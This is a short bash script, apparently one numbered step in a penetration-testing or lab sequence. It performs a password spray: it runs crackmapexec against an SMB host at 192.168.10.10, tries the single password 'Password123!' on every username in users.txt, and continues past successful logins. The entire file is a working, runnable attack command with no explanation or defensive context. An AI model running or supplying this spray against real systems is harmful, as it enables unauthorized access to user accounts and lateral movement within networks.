#!/bin/bash
# 02-spray.sh
# Password spray
crackmapexec smb 192.168.10.10 \
  -u users.txt \
  -p 'Password123!' \
  --continue-on-success
